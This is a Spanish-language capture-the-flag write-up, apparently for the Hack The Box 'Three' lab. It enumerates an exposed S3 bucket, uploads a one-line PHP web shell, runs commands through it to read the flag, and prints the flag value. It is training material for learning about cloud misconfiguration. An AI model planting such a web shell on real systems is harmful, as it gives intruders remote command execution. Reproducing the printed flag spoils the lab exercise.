--------
- Tags: #cloud #CustomApplications #AWS #reconocimiento #WebSiteStructureDiscovery #BuckerEnumeration #ArbitraryFileUpload #anonymous 
-------------
![](img/96786bf88a0768588eab691b2daad522.png)

![](img/48029065ce7f2e38832495c91949b8ef.png)

Realizamos un escaneo básico con Nmap:

```bash
nmap -p- -sV 10.129.163.114
```

![](img/0c1d7b47524928193e9d5b93a32531bd.png)

✅ Resultado:

- Puerto **22/tcp** → SSH
    
- Puerto **80/tcp** → HTTP (Apache 2.4.29)
    

📌 **Respuesta:** `2`

![](img/352a1a597958069aab520c414b37ed49.png)

En esta siguiente tarea, nos preguntan cual es el dominio de la cuenta de email en la seccion de Contact.

![](img/1721048f551f8482bf6c8ca5cdda796e.png)

Navegamos a:  
`http://10.129.163.114/#contact`

Vemos una dirección de correo terminada en:

📌 **Respuesta:** `thetoppers.htb`

![](img/8162b56427efbe214f76f07bfa96e55e.png)

## ¿Qué archivo de Linux resuelve nombres si no hay DNS?

La respuesta correcta es:

✅ **Respuesta:** `/etc/hosts`

![](img/fc5ff811cb292d58705f7f46f4bfeb38.png)

Editamos el archivo y añadimos:

```bash
10.129.163.114  thetoppers.htb
```

![](img/5bba1a6c073ee5d862d7cb3db0dae6c9.png)

## 🔎 Task 4 – Enumerar subdominios con Gobuster

Utilizamos `gobuster` con una wordlist de SecLists:

![](img/710d3f87c0994c5be3029b600ffeb84e.png)

**IMPORTANTE**

Es necesario clonar el repositorio de DanielMiessLer de SecLists en /usr/share/wordlists:

![](img/38232a57b7704d58d3b488568c62560e.png)

![](img/03ee961f91e03d268aa885edd478fe1d.png)

![](img/400eb94ec4989400cce699951a3edd12.png)

Bien, ya descargado en nuestro sistema, seguiremos con la tarea:

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
```

![](img/ba7942876a324ada1e7a444f3d17663a.png)

✅ **Respuesta:** `s3.thetoppers.htb`

## 💻 Task 5 – ¿Qué servicio corre en el subdominio?

![](img/33ffdee29408aeb78962b51f3dc5663d.png)

Buscando en Google, `s3.thetoppers.htb` corresponde a **Amazon S3**.


![](img/38f55a5e37047949495fe81a9b8d84e4.png)

## 💬 Task 6 – ¿Qué herramienta CLI interactúa con S3?



![](img/dcc412bceb1f952ab8e354c0ae6cc32b.png)

![](img/29dca65fab165fdffa22236b3bc2e8b0.png)

✅ **Respuesta:** `awscli`

En la siguiente, será AWS configure:

![](img/10145802719b919ec944fe6100dcbda4.png)

## 🌐 Task 8 – ¿Qué lenguaje de scripting utiliza el servidor?

Intentamos listar contenido:

```bash
aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
```

![](img/46c3278a0c1754a183aec30965c7e901.png)

📛 Error. Añadimos en `/etc/hosts` también el subdominio:

```bash
10.129.163.114 s3.thetoppers.htb
```

Volvemos a lanzar el comando y vemos archivos `.php`.  

![](img/46c3278a0c1754a183aec30965c7e901-1.png)

![](img/ec475adc2df4966f03409dc3116118e1.png)

## 🧠 Escalada: Shell reversa

Creamos un archivo con una shell web:

```bash
<?php system($_GET['cmd']); ?>
```

![](img/d8c42866d90bffc5b20a5ca385727d53.png)

Lo llamamos `shell.php`.

Crearemos este archivo, para poder tener funcionalidades de cmd en remoto.

📤 Lo subimos a S3:

```bash
aws s3 cp shell.php s3://thetoppers.htb --endpoint-url=http://s3.thetoppers.htb
```

![](img/c06080c2ca2b1f3074dccece9ca7079f.png)

📥 Verificamos que se subió:

```bash
aws s3 ls s3://thetoppers.htb --endpoint-url=http://s3.thetoppers.htb
```

📌 Entramos con:

```bash
http://thetoppers.htb/shell.php?cmd=ls
```

![](img/ceb675d2193f3b4a83299d5a8f278ecf.png)

## 🏁 Flag de usuario

Enumeramos el sistema desde la shell web:

```bash
http://thetoppers.htb/shell.php?cmd=ls+/var/www/html
http://thetoppers.htb/shell.php?cmd=ls+/var/www/html/../..
http://thetoppers.htb/shell.php?cmd=ls+/flag.txt
```

![](img/01c22783e8504bb93ac4a77ff2aef8de.png)

![](img/c4ce1b9d7a6ca338ae607c30e1bbd105.png)

![](img/3280fbbe2e2b9bf009916ba59c293343.png)

📜 Finalmente accedemos a la flag:

```bash
http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
```

![](img/8f266c7d438bca6f084437fbc172479d.png)

📍 **Flag: `a980d99281a28d638ac68b9bf9453c2b`**

## ✅ Conclusión final

- Se accede a una web vulnerable con servicio S3 expuesto sin autenticación.
    
- Se descubre el subdominio `s3.thetoppers.htb` mediante fuerza bruta con SecLists.
    
- Se interactúa con el servicio usando AWS CLI.
    
- El bucket permite listar y subir archivos.
    
- Se sube una shell PHP, desde donde se ejecutan comandos remotos.
    
- Finalmente, se accede a la flag.
    

🧠 **Lección aprendida:** Nunca se deben exponer servicios como AWS S3 de forma pública sin restricciones. La combinación de mala configuración, falta de control de acceso y carga de archivos sin validación lleva directamente a una ejecución remota de comandos (RCE).

